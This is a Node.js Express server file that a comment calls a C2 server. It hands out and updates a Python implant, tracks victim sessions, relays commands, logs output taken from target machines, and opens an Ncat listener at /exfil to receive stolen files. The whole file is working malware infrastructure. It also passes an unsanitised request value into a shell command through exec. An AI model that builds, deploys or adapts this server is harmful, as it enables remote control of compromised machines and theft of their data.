const express = require('express')
const fs = require('fs')
const path = require('path')
const hostname = '0.0.0.0';
const port = 63412;
var session = require('express-session');
const { exec } = require("child_process");

const app = express();

var command = "ipconfig";

app.use(session({
	secret: "keyboardCat",
	resave: false,
	saveUninitialized: true
}));

app.get('/', (req, res) => {
	sid = req.sessionID;
	var cwd = req.query.cwd;
	console.log(`${sid} has connected      Current Directory: ${cwd}`);
	fs.mkdirSync(`Sessions/${sid}`);
	fs.writeFile(`Sessions/${sid}/${sid}.log`, `Connection Established\nCurrent Directory: ${cwd}\n`, err => {
  		if (err) console.error(err)
	})
	fs.writeFile(`Sessions/${sid}/next`, 'wait', err => {
  		if (err) console.error(err)
	})
	res.send(`${sid}`);
});

app.get('/publicKey', function(req, res){
    var options = {
        root: path.join(__dirname)
    };

    var fileName = 'public_key.txt';
    res.sendFile(fileName, options, function (err) {
        if (err) {
            console.error(err);
        } else {
            console.log('Sent:', fileName);
        }
    });
});

app.get('/download', (req, res) => {
	res.download('Implant/implant.py')
})

app.get('/reconnect', (req, res) => {
	var sid = req.query.sid;
	var cwd = req.query.cwd;
	console.log(`${sid} has reconnected.      Current Directory: ${cwd}`);
	fs.appendFile(`Sessions/${sid}/${sid}.log`, `Connection has been reestablished\nCurrent Directory: ${cwd}\n`, err => {
			if (err) console.error(err)
	})
	res.send(`Welcome Back`);
});

app.get('/next' , (req, res) => {
	var sid = req.query.sid;
	fs.readFile(`Sessions/${sid}/next`, "utf8", function(err, data){
    	if(err) throw err;
    	res.send(data);
	});
});

//Used to return the output from the target machine to our C2 server
app.get('/info', (req, res) => {
    if(req.query.info != null){
		var sid = req.query.sid;
		var InfoText = req.query.info;
		console.log(`${sid}: ${InfoText}`)
		fs.appendFile(`Sessions/${sid}/${sid}.log`, `${InfoText}\n`, err => {
  			if (err) console.error(err)
		})
		ReturnToWait(sid)
    }
    res.send("Information Sent!")
});

//Used to send out command to the server to be read by the implant
//app.get('/retrcommand', (req, res) => {
//	var sid = req.query.sid;
//    res.send(command)
//	console.log(`${sid} has been sent ${command}.`);
//	ReturnToWait(sid)
//});

app.get('/updateImplant', (req, res) => {
	var sid = req.query.sid;
    res.download('Implant/implant.py')
	console.log(`${sid} has updated their implant.`);
	fs.appendFile(`Sessions/${sid}/${sid}.log`, `${sid} had downloaded a new implant.\n`, err => {
		if (err) console.error(err)
	})
	ReturnToWait(sid)
});

app.get('/exfil', (req, res) => {
	async function OpenExfilPort (sid) {
		var fileName = req.query.file;
		await exec(`Ncat -lp 1234 > Sessions/${sid}/${fileName}`, (err, stdout, stderr) => {
    		if (err) console.error(err)
    		if (stderr) console.error(stderr)
    		console.log(`${sid} has transferred file: ${fileName}.`);
		});
	}
	var sid = req.query.sid;
	OpenExfilPort(sid)
	res.send()
	ReturnToWait(sid)
});


//Trying to move old Session folders to an different folder
app.get('/destruct', (req, res) => {
	var sid = req.query.sid;
	var oldPath = `Sessions/${sid}`
	var newPath = `Deleted_Sessions/${sid}`

	fs.rename(oldPath, newPath, function (err) {
  	if (err) throw err
  	console.log('Successfully renamed - AKA moved!')
	})
});

function ReturnToWait(sid) {
	fs.writeFile(`Sessions/${sid}/next`, 'wait', err => {
  		if (err) console.error(err)
	})
}

app.listen(port, hostname);
